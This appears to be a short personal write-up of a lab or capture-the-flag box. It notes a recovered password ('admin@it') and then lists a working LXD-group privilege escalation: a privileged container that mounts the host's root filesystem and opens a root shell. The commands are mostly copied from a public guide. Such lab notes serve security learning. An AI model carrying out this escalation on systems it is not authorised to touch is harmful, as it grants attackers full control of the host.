# Getting Root

![[Pasted image 20211213134721.png]]

![[Pasted image 20211213134932.png]]

Pass: admin@it

Nothing interesting
![[Pasted image 20211213142509.png]]

try using the password to auth like user ash

LXD PRIV ESC 
![[Pasted image 20211213142627.png]]

### Exploit : https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

```bash
sudo su
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
sudo go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8

```


Then, upload to the vulnerable server the files **lxd.tar.xz** and **rootfs.squashfs**
![[Pasted image 20211213152710.png]]

Add the image:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

lxc image list #You can see your new imported image
```
![[Pasted image 20211213152756.png]]

```bash
lxd init
```

```bash
lxc init alpine privesc -c security.privileged=true
```

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

```bash
lxc start privesc
```

```bash
lxc exec privesc /bin/sh
```

![[Pasted image 20211213153417.png]]

